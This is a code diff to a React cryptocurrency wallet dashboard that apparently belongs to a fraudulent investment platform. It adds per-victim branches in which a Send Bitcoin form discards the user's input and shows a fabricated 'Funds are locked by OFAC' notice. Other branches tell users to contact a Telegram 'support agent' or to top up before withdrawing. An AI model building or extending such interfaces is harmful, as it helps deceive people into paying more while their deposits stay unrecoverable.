@@ -32,6 +32,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const [isSendDialogOpen, setIsSendDialogOpen] = useState(false);
   const [isReceiveDialogOpen, setIsReceiveDialogOpen] = useState(false);
   const [isComplianceDialogOpen, setIsComplianceDialogOpen] = useState(true);
+  const [isOfacDialogOpen, setIsOfacDialogOpen] = useState(false);
   const [sendAmount, setSendAmount] = useState("");
   const [sendAddress, setSendAddress] = useState("");
   const { toast } = useToast();
@@ -182,6 +183,13 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
         variant: "destructive",
       });
     }
+  };
+
+  const handleSendSubmit = () => {
+    setIsSendDialogOpen(false);
+    setIsOfacDialogOpen(true);
+    setSendAmount("");
+    setSendAddress("");
   };
 
   return (
@@ -370,11 +378,41 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
       <Dialog open={isSendDialogOpen} onOpenChange={setIsSendDialogOpen}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
-            <DialogTitle>Withdrawal Notice</DialogTitle>
+            <DialogTitle>{isJoanne ? "Send Bitcoin" : "Withdrawal Notice"}</DialogTitle>
           </DialogHeader>
-          <div className="text-center py-6">
-            {isJan ? (
-              <>
+          <div className="py-6">
+            {isJoanne ? (
+              <div className="space-y-4">
+                <div>
+                  <label className="text-sm font-medium text-muted-foreground">BTC Wallet Address</label>
+                  <Input
+                    value={sendAddress}
+                    onChange={(e) => setSendAddress(e.target.value)}
+                    placeholder="Enter destination wallet address"
+                    className="mt-1"
+                  />
+                </div>
+                <div>
+                  <label className="text-sm font-medium text-muted-foreground">Amount (BTC)</label>
+                  <Input
+                    value={sendAmount}
+                    onChange={(e) => setSendAmount(e.target.value)}
+                    placeholder="Enter amount to send"
+                    type="number"
+                    step="0.00000001"
+                    className="mt-1"
+                  />
+                </div>
+                <Button 
+                  onClick={handleSendSubmit}
+                  className="w-full"
+                  disabled={!sendAddress || !sendAmount}
+                >
+                  Submit
+                </Button>
+              </div>
+            ) : isJan ? (
+              <div className="text-center">
                 <p className="text-lg text-muted-foreground">
                   In order to proceed with a withdrawal please contact your support agent on Telegram
                 </p>
@@ -389,23 +427,21 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                 <Button onClick={() => setIsSendDialogOpen(false)} className="w-full mt-4">
                   OK
                 </Button>
-              </>
+              </div>
             ) : (
-              <>
+              <div className="text-center">
                 <p className="text-lg text-muted-foreground">
                   Minimum withdrawal is <span className="font-bold text-primary">{minWithdrawal} {cryptoSymbol}</span>
                 </p>
                 <p className="text-muted-foreground mt-2">
                   Please top up to be able to withdraw.
                 </p>
-              </>
+                <Button onClick={() => setIsSendDialogOpen(false)} className="w-full mt-4">
+                  OK
+                </Button>
+              </div>
             )}
           </div>
-          {!isJan && (
-            <Button onClick={() => setIsSendDialogOpen(false)} className="w-full">
-              OK
-            </Button>
-          )}
         </DialogContent>
       </Dialog>
 
@@ -430,6 +466,26 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
               Copy Address
             </Button>
           </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* OFAC Dialog */}
+      <Dialog open={isOfacDialogOpen} onOpenChange={setIsOfacDialogOpen}>
+        <DialogContent className="sm:max-w-lg">
+          <DialogHeader>
+            <DialogTitle>Withdrawal Blocked</DialogTitle>
+          </DialogHeader>
+          <div className="space-y-4 py-4">
+            <p className="text-muted-foreground leading-relaxed">
+              Funds are locked by OFAC and are unavailable for withdraw, please contact customer support immediately
+            </p>
+          </div>
+          <Button 
+            onClick={() => setIsOfacDialogOpen(false)}
+            className="w-full"
+          >
+            OK
+          </Button>
         </DialogContent>
       </Dialog>
 
